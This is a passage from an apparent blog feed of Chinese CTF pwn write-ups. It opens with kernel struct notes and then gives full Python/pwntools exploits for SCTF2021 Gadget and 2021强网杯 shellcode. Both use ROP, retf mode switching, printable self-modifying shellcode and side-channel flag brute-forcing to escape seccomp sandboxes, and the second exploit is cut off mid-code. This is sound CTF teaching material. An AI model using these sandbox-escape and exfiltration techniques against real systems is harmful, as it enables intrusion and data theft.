(*splice_eof)(<span class="keyword">struct</span> file *file);</span><br><span class="line"><span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line"><span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">  <span class="type">loff_t</span> len);</span><br><span class="line"><span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line"><span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line"><span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">loff_t</span> (*remap_file_range)(<span class="keyword">struct</span> file *file_in, <span class="type">loff_t</span> pos_in,</span><br><span class="line">   <span class="keyword">struct</span> file *file_out, <span class="type">loff_t</span> pos_out,</span><br><span class="line">   <span class="type">loff_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> remap_flags);</span><br><span class="line"><span class="type">int</span> (*fadvise)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*uring_cmd)(<span class="keyword">struct</span> io_uring_cmd *ioucmd, <span class="type">unsigned</span> <span class="type">int</span> issue_flags);</span><br><span class="line"><span class="type">int</span> (*uring_cmd_iopoll)(<span class="keyword">struct</span> io_uring_cmd *, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> poll_flags);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>有点像proc_operations的plus版</p><p><strong>cdev</strong></p><p><code>cdev</code> 结构体是 Linux 内核中用于表示字符设备的结构体。它包含了字符设备的一些重要信息和操作函数，用于向内核注册和管理字符设备。下面是 <code>cdev</code> 结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="type">dev_t</span> dev;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p><code>cdev</code> 结构体的主要成员包括：</p><ol><li><strong><code>struct kobject kobj</code>：</strong> 用于实现内核对象，与 sysfs 文件系统相关，提供一种在用户空间访问设备信息的机制。</li><li><strong><code>struct module *owner</code>：</strong> 拥有该字符设备的内核模块。</li><li><strong><code>const struct file_operations *ops</code>：</strong> 与字符设备关联的文件操作结构体，包含了指向设备的操作函数指针，如 <code>open</code>、<code>read</code>、<code>write</code>、<code>release</code> 等。</li><li><strong><code>struct list_head list</code>：</strong> 用于将 <code>cdev</code> 结构体链接到其他设备结构体的链表。</li><li><strong><code>dev_t dev</code>：</strong> 字符设备的设备号，包括主设备号和次设备号。</li><li><strong><code>unsigned int count</code>：</strong> 设备号的数量，通常为 1。</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>内核pwn其实与用户态pwn并无太大的差异</p><p>就是通过编译执行二进制程序触发加载在内核中的模块存在的漏洞</p><p>想办法完成提权,然后再返回到用户态下getshell</p>]]></content>
    
    
    <summary type="html">从两道例题初步理解内核pwn</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="kernel" scheme="https://ixout.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>杂题录</title>
    <link href="https://ixout.github.io/posts/4584/"/>
    <id>https://ixout.github.io/posts/4584/</id>
    <published>2023-12-11T13:13:24.000Z</published>
    <updated>2024-12-06T03:20:47.975Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SCTF2021-Gadget"><a href="#SCTF2021-Gadget" class="headerlink" title="SCTF2021 Gadget"></a>SCTF2021 Gadget</h1><p><strong>标签:retf|侧信道攻击|沙盒</strong></p><p>程序是静态链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/gadget&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000025  if (A == alarm) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>程序有seccomp只允许三个系统调用</p><p>传统的orw,因为只有<code>read</code>，<code>open</code>和<code>write</code>都被禁用而无法使用。</p><p>再回到程序本身程序读取时存在栈溢出,这是主要的漏洞点</p><p>不过可以观察到沙盒并没有限制系统的ARCH,同时fstat的系统调用号在32位中恰好是open的系统调用</p><p>搜索gadget,可以发现存在retf,retf可以用来切换32位模式(ropper搜索并没有找到这个gadget,但ROPgadget找到了,ropper也可以找到不过要用—instructions选项,因此找gadget还是要小心一点)</p><p>此时open的问题解决了,但还有一个问题,就是程序没有输出,一个可行的方案是采用侧信道的方式逐个输出</p><blockquote><p>侧信道攻击：在程序无法回显时，通过程序反馈的信息对进行flag逐位爆破。</p></blockquote><p>恰好程序中有这么一段gadget</p><p><code>cmp byte ptr [rax - 0x46], cl; push rbp; ret 0x5069;</code></p><p>和一段无限循环的代码</p><p><code>.text:0000000000405837 EB FE                         jmp     short loc_405837</code></p><p>用这两部分代码来探测是否爆破成功</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">possible_list = <span class="string">&quot;0123456789_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x500</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401001</span></span><br><span class="line">pop_rbx_r14_r15_rbp_ret = <span class="number">0x403072</span></span><br><span class="line">pop_rcx_ret = <span class="number">0x40117b</span></span><br><span class="line">pop_rdi_rbp_ret = <span class="number">0x401734</span></span><br><span class="line">pop_rdi_jmp_rax = <span class="number">0x402be4</span></span><br><span class="line">pop_rsi_r15_rbp_ret = <span class="number">0x401732</span></span><br><span class="line">mov_rsi_r15_mov_rdx_r12_call_r14 = <span class="number">0x402c04</span> <span class="comment"># call -&gt; push + jmp</span></span><br><span class="line">pop_r12_r14_r15_rbp_ret = <span class="number">0x40172f</span></span><br><span class="line">pop_rsp_ret = <span class="number">0x409d1c</span> <span class="comment"># mov edi,...</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x401102</span></span><br><span class="line">syscall_pop_rbp_ret = <span class="number">0x401165</span></span><br><span class="line">int_0x80_ret = <span class="number">0x4011f3</span></span><br><span class="line">retf_addr = <span class="number">0x4011ed</span></span><br><span class="line">cmp_addr = <span class="number">0x408266</span> <span class="comment"># cmp byte ptr [rax - 0x46], cl ; push rbp ; ret 0x5069</span></span><br><span class="line">jnz_addr = <span class="number">0x405831</span> <span class="comment"># jnz  0x405837</span></span><br><span class="line">loop = <span class="number">0x405837</span> <span class="comment"># jmp  0x405837</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">index, char</span>):</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_rbp_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_r12_r14_r15_rbp_ret) + p64(<span class="number">0x100</span>) + p64(syscall_pop_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rsi_r15_mov_rdx_r12_call_r14) + p64(pop_rsp_ret) + p64(bss_addr + <span class="number">8</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(pop_rax_ret) + p64(<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rbx_r14_r15_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(pop_rcx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(retf_addr) + p32(int_0x80_ret) + p32(<span class="number">0x23</span>)</span><br><span class="line">payload += p32(retf_addr) + p32(pop_rax_ret) + p32(<span class="number">0x33</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_rbp_ret) + p64(<span class="number">3</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_rbp_ret) + p64(bss_addr + <span class="number">0x200</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(syscall_pop_rbp_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss_addr + <span class="number">0x200</span> + <span class="number">0x46</span> + index)</span><br><span class="line">payload += p64(pop_rcx_ret) + p64(char)</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(jnz_addr)</span><br><span class="line">payload += p64(cmp_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible_list :</span><br><span class="line">io = process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">pwn(pos, <span class="built_in">ord</span>(i))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">io.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">io.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos = pos + <span class="number">1</span></span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p>当爆破成功时,程序就会段错误,那么调用recv时就会立即捕获到错误,以此判断成功</p><p>当爆破失败时,程序就会进入无限循环,从而自行结束开始下一次运行</p><h1 id="2021强网杯-shellcode"><a href="#2021强网杯-shellcode" class="headerlink" title="2021强网杯 shellcode"></a>2021强网杯 shellcode</h1><p><strong>标签:retf|侧信道攻击|沙盒|可见字符shellcode|SMC</strong></p><p>这一题与上一题一个套路</p><p>程序就只由一段代码构成,看来应该是手搓的elf</p><p>开启了沙盒只允许有限几个系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A == stat) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>程序执行的内容很简单</p><p>mmap分配一块rwx的内存,向其中读入数据作为shellcode运行</p><p>不过限制读入的shellcode必须要由可见字符构成,这个限制就使得很多汇编代码无法使用,包括syscall等等,可以使用smc绕过</p><p>延续上一题的思路需要使用retf,但是这题与上一题不同在于其没有bss段,所以在切换系统宽度时会出错</p><p>这时候可以自己指定地址mmap一块内存</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">possible_list = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_open_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*fp = open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">mov esp,0x40404140</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x4040405E</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag += <span class="string">F&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmp byte ptr[rsi+<span class="subst">&#123;pos&#125;</span>], <span class="subst">&#123;char&#125;</span></span></span><br><span class="line"><span class="string">ja loop</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">shellcode_open_x86 = asm(shellcode_open_x86, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode_read_flag = asm(shellcode_read_flag, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set rdx*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x47</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set r8*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rax /*set r9*/</span></span><br><span class="line"><span class="string">pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*syscall*/</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x31],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x32],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40/*set rax*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x49</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x55],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x56],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x70</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x72</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">push 0x47</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">push 0x48</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos, char</span>):</span><br><span class="line">shellcode = shellcode_mmap</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode += shellcode_retfq</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode = asm(shellcode, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(shellcode_open_x86 + shellcode_read_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">start = time.time()</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> left &lt; right :</span><br><span class="line">mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pwn(pos, <span class="built_in">ord</span>(possible_list[mid]))</span><br><span 